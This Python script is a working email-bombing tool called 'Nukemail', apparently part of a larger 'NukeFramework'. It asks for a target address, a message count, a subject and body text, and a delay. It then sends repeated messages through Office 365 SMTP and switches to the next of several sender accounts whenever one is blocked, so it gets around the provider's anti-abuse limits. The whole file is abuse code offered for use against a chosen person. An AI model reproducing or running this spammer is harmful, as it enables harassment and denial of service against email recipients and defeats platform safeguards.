import smtplib 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
from timeit import repeat
import time
# the amount of emails already sent
alreadysent = 0
mailsbythis = 0
# this is the email password
password = ""
os.chdir(os.path.dirname(os.path.realpath(__file__)))


#account email addresses

account1 = ""
account2 = ""
account3 = ""
account4 = ""
account5 = ""
account6 = ""
account7 = ""
account8 = ""

# making a clear command
def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

#defining a welcome message
def welcome():
    print("==========================================================")
    print("Welcome to Nukemail (integrated Email Spammer of Nuke)")
    print("==========================================================")
    print("")
clr()

def exitrun():
    os.chdir("..")
    print("Returning to NukeFramework...")
    time.sleep(1)
    clr()
    os.system("python3 run.py")
    exit()





clr()
welcome()
#Collecting Details of the Target

time.sleep(0.5)
target = input("Enter the target email address (or type exit if you want to return to nf1): ")
if target == "exit":
    exitrun()

clr()
welcome()
amount = int(input("Enter the amount of emails you want to send: "))
clr()
welcome()
regarding = input("Enter the subject of the email: ")
clr()
welcome()
content = input("Enter the content of the email: ")
clr()
welcome()
sleep = int(input("Enter the amount of seconds you want to sleep between each email: "))
clr()

#defining a spammer function

def Spammer(xyz):
    try:
        clr()
        global alreadysent
        mailsbythis = 0
        message = MIMEMultipart()
        message['From'] = xyz
        message['To'] = target
        message['Subject'] = regarding
        message.attach(MIMEText(content, 'plain'))

        session = smtplib.SMTP('smtp.office365.com', 587)
        session.starttls()
        session.login(xyz, password)
        textcontent = message.as_string()
        for i in range(alreadysent, amount):
            session.sendmail(xyz, target, textcontent)
            print("Email sent to: " + target)
            print("")
            alreadysent = alreadysent + 1
            mailsbythis = mailsbythis + 1
            time.sleep(sleep)
    except:            
        session.quit()
        print(xyz + " has been blocked; continuing with the next Account \n\n Mails already sent: " + str(alreadysent) + "\n Mails sent by this Account: " + str(mailsbythis)+ "\n\n\n Debugging Details: " + "\n\n Target: " + target + "\n Subject: " + regarding + "\n Content: " + content + "\n Sleeptime: " + str(sleep) + "\n Spam amount: " + str(amount))
        time.sleep(1)
        print("\n continuing in 3 seconds")
        time.sleep(1)
        clr()
        print(xyz + " has been blocked; continuing with the next Account \n\n Mails already sent: " + str(alreadysent) + "\n Mails sent by this Account: " + str(mailsbythis)+ "\n\n\n Debugging Details: " + "\n\n Target: " + target + "\n Subject: " + regarding + "\n Content: " + content + "\n Sleeptime: " + str(sleep) + "\n Spam amount: " + str(amount))
        print("\n continuing in 2 seconds")
        time.sleep(1)
        clr()
        print(xyz + " has been blocked; continuing with the next Account \n\n Mails already sent: " + str(alreadysent) + "\n Mails sent by this Account: " + str(mailsbythis)+ "\n\n\n Debugging Details: " + "\n\n Target: " + target + "\n Subject: " + regarding + "\n Content: " + content + "\n Sleeptime: " + str(sleep) + "\n Spam amount: " + str(amount))
        print("\n continuing in 1 seconds")
        time.sleep(1)


        
        
        

# run the spammer function with all account variables
Spammer(account1)
Spammer(account2)
Spammer(account3)
Spammer(account4)
Spammer(account5)
Spammer(account6)
Spammer(account7)













   

                                
               







